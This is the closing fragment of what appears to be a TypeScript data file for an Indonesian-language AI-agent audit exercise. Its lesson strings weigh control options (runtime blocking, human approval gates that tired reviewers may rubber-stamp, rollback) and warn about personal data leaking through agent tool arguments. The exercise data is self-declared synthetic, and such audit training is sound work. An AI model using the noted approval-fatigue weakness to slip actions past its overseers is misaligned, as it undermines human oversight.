      "Keputusan kontrol selalu punya harga: blokir runtime (kuat, butuh 3 minggu platform), approval gate (manusia bisa lelah → stempel karet), rollback (kehilangan fitur, akar masalah tak terjawab).",
      "PII di argumen tool = kebocoran yang menunggu waktu — terutama di tool pengirim data keluar; redaksi yang benar melindungi PII, bukan pelaku.",
      "Data: SINTETIS (generator seed 42), 14 Okt 2026; NIK/nomor HP/URL fiktif; pola serangan disederhanakan untuk latihan.",
    ],
  },
];

(misiAgentAudit.steps as V2Step[]).push(...LANJUTAN_AUDIT);
